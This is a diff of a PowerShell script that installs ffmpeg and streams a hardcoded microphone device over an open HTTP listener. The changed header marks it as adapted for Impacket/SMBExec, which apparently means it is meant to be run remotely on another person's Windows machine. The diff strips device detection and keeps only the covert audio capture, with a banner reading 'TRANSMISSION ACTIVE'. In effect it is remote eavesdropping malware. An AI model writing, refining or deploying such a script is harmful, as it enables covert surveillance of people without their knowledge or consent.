@@ -1,5 +1,5 @@
 <#
-Stream Audio/Video for Windows
+Stream Audio/Video - Compativel com Impacket/SMBExec
 Repo: https://github.com/l0ckz3r0/StreamAudioWin
 #>
 
@@ -39,17 +39,11 @@ function Install-Ffmpeg {
     Remove-Item $tmp_zip, $tmp_dir -Recurse -Force -ErrorAction SilentlyContinue
 }
 
-# === DETECT DEVICES ===
-function Get-Devices {
-    $out = & $ffmpeg -list_devices true -f dshow -i dummy 2>&1
-    $has_cam = $out -match "DirectShow video devices"
-    $has_mic = $out -match "DirectShow audio devices"
-    return @{ Cam=$has_cam; Mic=$has_mic }
-}
-
-# === GET LOCAL IP ===
-function Get-LocalIP {
-    $ip = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.InterfaceAlias -notmatch 'Loopback|VMware|Virtual' -and $_.IPAddress -notlike '169.254.*' } | Select-Object -First 1).IPAddress
+# === GET IP ===
+function Get-MyIP {
+    $ip = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object {
+        $_.InterfaceAlias -notmatch "Loopback|VMware|Virtual" -and $_.IPAddress -notlike "169.254.*"
+    } | Select-Object -First 1).IPAddress
     if (-not $ip) { $ip = "10.0.0.92" }
     return $ip
 }
@@ -57,31 +51,20 @@ function Get-LocalIP {
 # === MAIN ===
 Clear-Host
 Write-Host "==========================================="
-Write-Host "    STREAM AUDIO / VIDEO AUTOMATICO"
+Write-Host "      STREAM AUDIO / VIDEO"
 Write-Host "==========================================="
 
 Set-Permissions
 Install-Ffmpeg
-$dev = Get-Devices
-$myip = Get-LocalIP
+$myip = Get-MyIP
 
-Write-Host "`nDetecting devices..."
+Write-Host "`nStarting transmission..."
 
-if ($dev.Cam) {
-    Write-Host "-> Using CAMERA"
-    $cmd = "`"$ffmpeg`" -y -f dshow -framerate 15 -video_size 1280x720 -i video=`"Integrated Camera`" -vcodec mjpeg -q:v 5 -f mpjpeg -listen 1 `"http://0.0.0.0:$port/stream`""
-}
-elseif ($dev.Mic) {
-    Write-Host "-> Using MICROPHONE"
-    $cmd = "`"$ffmpeg`" -y -f dshow -rtbufsize 2M -i audio=`"@device_cm_{33D9A762-90C8-11D0-BD43-00A0C911CE86}\wave_{49D00171-596A-469A-9582-F9E720EA5E4F}`" -acodec mp3 -b:a 64k -ar 22050 -ac 1 -f mp3 -listen 1 `"http://0.0.0.0:$port/stream`""
-}
-else {
-    Write-Host "-> No device found"
-    exit 1
-}
+# Usa identificador tecnico direto do microfone que ja funcionou antes
+$cmd = "`"$ffmpeg`" -y -f dshow -rtbufsize 2M -i audio=`"@device_cm_{33D9A762-90C8-11D0-BD43-00A0C911CE86}\wave_{49D00171-596A-469A-9582-F9E720EA5E4F}`" -acodec mp3 -b:a 64k -ar 22050 -ac 1 -f mp3 -listen 1 `"http://0.0.0.0:$port/stream`""
 
 Write-Host "`n==========================================="
-Write-Host "STREAM READY"
+Write-Host "TRANSMISSION ACTIVE"
 Write-Host "Access via VLC: http://$myip`:$port/stream"
 Write-Host "==========================================="
 
